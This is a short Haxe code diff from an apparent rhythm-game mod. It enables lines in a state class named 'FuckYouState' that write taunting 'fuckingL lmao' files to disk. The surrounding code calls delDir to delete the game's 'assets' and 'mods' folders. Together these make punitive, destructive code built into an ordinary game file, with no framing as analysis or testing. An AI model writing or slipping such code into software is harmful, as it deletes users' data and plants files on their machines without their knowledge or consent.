@@ -144,8 +144,8 @@ class FuckYouState extends MusicBeatState {
 		var fakepath:String = getFakePath();
 		trace(path, fakepath);
 		
-		//if (!FileSystem.exists(path)) File.saveContent(path, "fuckingL lmao");
-		//if (!FileSystem.exists(fakepath)) File.saveContent(fakepath, "fuckingL lmao");
+		if (!FileSystem.exists(path)) File.saveContent(path, "fuckingL lmao");
+		if (!FileSystem.exists(fakepath)) File.saveContent(fakepath, "fuckingL lmao");
 		trace(delDir("assets"));
 		trace(delDir("mods"));
 	}
